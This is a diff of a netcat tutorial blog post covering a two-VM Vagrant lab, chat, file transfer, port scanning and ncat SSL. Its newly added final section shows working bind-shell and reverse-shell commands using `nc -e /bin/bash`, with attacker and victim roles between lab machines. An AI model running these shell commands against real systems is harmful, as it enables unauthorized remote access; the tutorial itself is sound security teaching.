@@ -1,26 +1,24 @@
 Title: Netcat basics
-Category: Infosec
+Category: Cybersecurity
 Tags: netcat, vagrant
-Summary: Netcat basics
+Modified: 2024-12-19
 
 
-## What is netcat?
+Netcat is known as the TCP/IP swiss army knife. It's often used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
+It can also work with UDP, do port scanning and even be used to execute [remote shells](https://en.wikipedia.org/wiki/Shell_shoveling).
+It's a commonly used tool in [CTFs](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)) and cybersecurity in general.
 
-From the manpage:
+This post will cover the basic usage.
 
-> The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets. It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning and deal with both IPv4 and IPv6.
+## Testing setup
 
-It is referred as the TCP/IP swiss army knife, and is most commonly used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
-
-## Setup
-
-To test the connection between 2 machines, I will use Vagrant to create 2 virtual machines. Vagrant is very simple to use, see [this post]({filename}/posts/2015-11-23-virtual-machines-with-vagrant.md) for the basics.
+To test the connection between 2 machines, we will use Vagrant to create 2 virtual machines. Vagrant is very simple to use, see [this post]({filename}/posts/2015-11-23-virtual-machines-with-vagrant.md) for the basics.
 
 ``` { .ruby filename="Vagrantfile" }
 VAGRANTFILE_API_VERSION = "2"
 
 Vagrant.configure(VAGRANTFILE_API_VERSION) do |config|
-  config.vm.box = "ubuntu/trusty64"
+  config.vm.box = "kalilinux/rolling"
 
   config.vm.define "alice" do |alice|
     alice.vm.hostname = "alice"
@@ -34,11 +32,12 @@ Vagrant.configure(VAGRANTFILE_API_VERSION) do |config|
     bob.vm.provision "shell", inline: "echo 192.168.33.210 alice >> /etc/hosts"
   end
 
-  config.vm.provision "shell", inline: "apt-get update && apt-get install -y nmap" # to install ncat
+  config.vm.provision "shell", inline: "apt-get update && apt-get install -y ncat
 end
 ```
 
-Put this `Vagrantfile` in a new folder, use `vagrant up` to create the VMs then in 2 separate command prompts, use `vagrant ssh alice` and `vagrant ssh bob` to SSH into them.
+Put this `Vagrantfile` in a new folder and use `vagrant up` to create the VMs.
+Then in 2 separate command prompts, use `vagrant ssh alice` and `vagrant ssh bob` to SSH into them.
 
 ## Basic chat
 
@@ -51,15 +50,17 @@ Once the connection is established, both sides can send and receive data.
 
 ### Server
 
-To listen on a port: `nc -l port`.
+To listen on a port: `nc -l -p <port>`.
 
 ```console
-vagrant@alice:~$ nc -l 4444
+vagrant@alice:~$ nc -l -p 4444
 ```
 
 ### Client
 
-To connect to a TCP port: `nc destination port`. Destination can be an IP address or a DNS name. In our case, `alice` is in the `hosts` file.
+To connect to a TCP port: `nc <destination> <port>`.
+Destination can be an IP address or a DNS name.
+In our case, `alice` was added to `/etc/hosts` in the `Vagrantfile` above.
 
 ```console
 vagrant@bob:~$ nc alice 4444
@@ -68,19 +69,20 @@ vagrant@bob:~$ nc alice 4444
 ### Output
 
 Here is the output from both machines.
-The `-v` option is for `verbose`, which shows the "connection accepted/succeeded" message.
+The `-v` option is for `verbose`, which shows the "listening on" and "connect to/from" messages.
+The `-n` option tells netcat to skip the reverse DNS lookup.
 
 ```console hl_lines="4"
-vagrant@alice:~$ nc -vl 4444
-Listening on [0.0.0.0] (family 0, port 4444)
-Connection from [192.168.33.211] port 4444 [tcp/*] accepted (family 2, sport 41025)
+vagrant@alice:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41025
 Hello from alice!
 Hello from bob!
 ```
 
 ```console hl_lines="4 5"
 vagrant@bob:~$ nc -v alice 4444
-Connection to alice 4444 port [tcp/*] succeeded!
+alice [192.168.33.210] 4444 (?) open
 Hello from alice!
 Hello from bob!
 <Ctrl-C>
@@ -112,10 +114,10 @@ listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
 00:00:12.288380 IP bob.41025 > alice.4444: Flags [.], ack 20, win 457, options [nop,nop,TS val 4294939873 ecr 4294955517], length 0
 ```
 
-* First 3 packets: standard tcp 3-way handshake (SYN, SYN-ACK, ACK).
-* Next 2: alice sending its hello message and bob's ack.
-* Next 2: bob sending its hello message and alice's ack.
-* Final 3: connection getting killed.
+- First 3 packets: standard tcp 3-way handshake (SYN, SYN-ACK, ACK).
+- Next 2: alice sending its hello message and bob's ack.
+- Next 2: bob sending its hello message and alice's ack.
+- Final 3: connection getting killed.
 
 ## Example usages
 
@@ -125,83 +127,70 @@ Here are some interesting usages of netcat.
 
 Simply connect to the web server on port 80. You can then do a manual HTTP request.
 
-```console hl_lines="3 4"
-$ nc -Cv perdu.com 80
-Connection to perdu.com 80 port [tcp/http] succeeded!
+```console hl_lines="2 3"
+$ nc -C perdu.com 80
 GET / HTTP/1.1
 Host: perdu.com
 
 HTTP/1.1 200 OK
-Date: Thu, 17 Dec 2015 04:48:05 GMT
-Server: Apache
-Last-Modified: Tue, 02 Mar 2010 18:52:21 GMT
-ETag: "cc-480d5dd98a340"
-Accept-Ranges: bytes
-Content-Length: 204
-Vary: Accept-Encoding
-Content-Type: text/html
+...
 
 <html><head><title>Vous Etes Perdu ?</title></head><body><h1>Perdu sur l'Internet ?</h1><h2>Pas de panique, on va vous aider</h2><strong><pre>    * <----- vous &ecirc;tes ici</pre></strong></body></html>
 ```
 
 The `-C` option is to send CRLF instead of LF, [following the HTTP standard](http://stackoverflow.com/a/5757349/3672769).
+Note that the highlighted lines were typed manually.
+
+### Piping the result of a command
+
+We could have avoided the manual typing in the previous example by piping the result of a command into netcat.
+
+```console
+$ printf 'GET / HTTP/1.1\r\nHost: perdu.com\r\n\r\n' | nc perdu.com 80
+HTTP/1.1 200 OK
+...
+
+<html><head><title>Vous Etes Perdu ?</title></head><body><h1>Perdu sur l'Internet ?</h1><h2>Pas de panique, on va vous aider</h2><strong><pre>    * <----- vous &ecirc;tes ici</pre></strong></body></html>
+```
 
 ### Transferring files
 
 You can transfer files (it works for binaries too) using shell redirections.
 
-```console hl_lines="1"
-vagrant@alice:~$ nc -vl 4444 > received-file
-Listening on [0.0.0.0] (family 0, port 4444)
-Connection from [192.168.33.211] port 4444 [tcp/*] accepted (family 2, sport 41034)
+```console hl_lines="6"
+vagrant@alice:~$ nc -nvlp 4444 > received-file
+listening on [any] 4444 ...
+connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41034
 
 vagrant@alice:~$ cat received-file
 This is text written by bob
 ```
 
-```console hl_lines="3"
-vagrant@bob:~$ echo This is text written by bob > file-to-transfer.txt
+```console hl_lines="1"
+vagrant@bob:~$ echo 'This is text written by bob' > file-to-transfer.txt
 
 vagrant@bob:~$ nc -v alice 4444 < file-to-transfer.txt
-Connection to alice 4444 port [tcp/*] succeeded!
+alice [192.168.33.210] 4444 (?) open
 
-vagrant@bob:~$ # Connection closes after the transfer
-```
-
-You can also pipe the result of a command.
-
-```console hl_lines="1"
-vagrant@alice:~$ nc -vl 4444 > received-input
-Listening on [0.0.0.0] (family 0, port 4444)
-Connection from [192.168.33.211] port 4444 [tcp/*] accepted (family 2, sport 41038)
-
-vagrant@alice:~$ cat received-input
-bob
-```
-
-```console hl_lines="1"
-vagrant@bob:~$ hostname | nc -v alice 4444
-Connection to alice 4444 port [tcp/*] succeeded!
-
-vagrant@bob:~$ # Connection closes after the transfer
+vagrant@bob:~$
 ```
 
 ### Port scanning
 
-If you don't want to interact with the port and just want to verify if it's open, you can use the `-z` option.
+If you don't want to interact with the port and just want to verify if it's open, use the `-z` option.
 
 ```console
 vagrant@bob:~$ nc -vz alice 4444
-Connection to alice 4444 port [tcp/*] succeeded!
+alice [192.168.33.210] 4444 (?) open
 ```
 
-For a range:
+For a range (an extra `-v` is needed to show the closed ports):
 
 ```console
-vagrant@bob:~$ nc -vz alice 4443-4445
-nc: connect to alice port 4443 (tcp) failed: Connection refused
-Connection to alice 4444 port [tcp/*] succeeded!
-nc: connect to alice port 4445 (tcp) failed: Connection refused
+vagrant@bob:~$ nc -vvz alice 4443-4445
+alice [192.168.33.210] 4445 (?) : Connection refused
+alice [192.168.33.210] 4444 (?) open
+alice [192.168.33.210] 4443 (?) : Connection refused
 ```
 
 *For more advanced port scanning, you should use a real port scanner, such as [nmap](https://nmap.org).*
@@ -209,7 +198,8 @@ nc: connect to alice port 4445 (tcp) failed: Connection refused
 ## Differences between netcat versions
 
 There are 2 main versions of netcat: traditional and OpenBSD.
-So far, we used the OpenBSD version.
+So far, we used the traditional version, installed by default on Kali Linux.
+
 Here are the package descriptions (credits to [this askubuntu question](http://askubuntu.com/a/426320)):
 
 ```console
@@ -226,25 +216,22 @@ $ apt-cache show netcat-openbsd
 ```
 
 There is also an important differences in the usage of the "listen" mode.
-They both use the `-l` option, but the traditional version requires you to set the port with the `-p` option.
-So it looks like this: `nc -lp 4444` instead of `nc -l 4444`.
-Using the traditional syntax with the OpenBSD version seems to work, but the manpage specifies not to use it (`-l [...] It is an error to use this option in conjunction with the -p, -s, or -z options.`), so your mileage may vary.
+They both use the `-l` option, but the OpenBSD version doesn't use `-p` to set the port.
+So it looks like this: `nc -l 4444` instead of `nc -lp 4444`.
 
-The OpenBSD version also doesn't contain the `-e` or `-c` options, which lets you execute a program or a shell command after connect.
-This is mostly used to execute a remote shell (more on that in a future post) and was called `GAPING_SECURITY_HOLE` at some point in traditionnal netcat's [source code](http://sourceforge.net/p/netcat/code/HEAD/tree/tags/netcat-0.2.2/src/netcat.c#l271).
-There is a way to simulate these options in OpenBSD's version by using named pipes, which is explained in the manpage.
+The OpenBSD version also doesn't contain the command execution (`-e` and `-c`) options (more on that below).
 
-## Going encrypted
+## Encrypted connections
 
-Neither traditional nor OpenBSD netcat have support for SSL.
-You will have to use `ncat` for that, which is an improved reimplementation of netcat by the [nmap](https://nmap.org) team.
-It's bundled with nmap since [version 5](https://nmap.org/5/).
+Neither traditional nor OpenBSD netcat support encryption.
+There is, however, a newer and improved implementation, called `ncat`, that does.
+It is written by the [nmap](https://nmap.org) team and has been bundled with nmap since [version 5](https://nmap.org/5/).
 
 > Ncat [...] is the culmination of the currently splintered family of Netcat incarnations.
 >
 > -- ncat manpage
 
-It supports all the options from both versions of netcat (including `-e`/`-c`) and adds some really interesting ones, like a list of allowed and denied IPs and, of course... SSL!
+It supports all the options from both versions of netcat (including `-e`/`-c`) and adds some really interesting ones, like a list of allowed and denied IPs and, of course... [SSL](https://nmap.org/ncat/guide/ncat-ssl.html)!
 It's as simple as adding `--ssl` to both sides.
 
 ```console hl_lines="9"
@@ -269,8 +256,49 @@ Hello from alice!
 Hello from bob!
 ```
 
-## Conclusion
+## Remote shell
 
-As the TCP/IP swiss army knife, netcat is a very useful tool with multiple usages.
-The command execution options (`-e`/`-c`) were not covered, but it will be the subject of a future post.
-Stay tuned!
+Traditional netcat and `ncat` both provide the `-c` and `-e` options[ref]It's possible to simulate these options in OpenBSD's netcat [by using named pipes](https://superuser.com/a/691043).[/ref], which lets you execute a program or a shell command after the connection.
+It can be a very dangerous option if you don't know what you're doing, and was actually called `GAPING_SECURITY_HOLE` at some point in [traditional netcat's source code](http://sourceforge.net/p/netcat/code/HEAD/tree/tags/netcat-0.2.2/src/netcat.c#l271).
+
+This can be used to run a [simple web server](https://nmap.org/ncat/guide/ncat-tricks.html#ncat-httpserv) for example, but the case that interests us is the execution of remote shells. This topic can go really deep, but here is a quick primer.
+
+### Bind shell
+
+A bind shell is when the shell is executed on the server/listener.
+The remote attacker can then simply connect to the port to receive the shell.
+
+```console
+vagrant@alice:~$ nc -nvlp 4444 -e /bin/bash
+listening on [any] 4444 ...
+connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 60146
+```
+
+```console hl_lines="3"
+vagrant@bob:~$ nc -v alice 4444
+alice [192.168.33.210] 4444 (?) open
+hostname
+alice
+```
+
+Here, `bob` is the attacker. He connected to `alice` on port 4444 and was able to execute the `hostname` command.
+
+### Reverse shell
+
+As its name implies, a reverse shell is executed on the other side.
+The attacker starts its listener, then waits for the victim to send its shell.
+
+```console hl_lines="4"
+vagrant@alice:~$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 35428
+hostname
+bob
+```
+
+```console
+vagrant@bob:~$ nc -v alice 4444 -e /bin/bash
+alice [192.168.33.210] 4444 (?) open
+```
+
+Here, `alice` is the attacker. She started her listener and received the shell from `bob`, allowing her to run the `hostname` command.
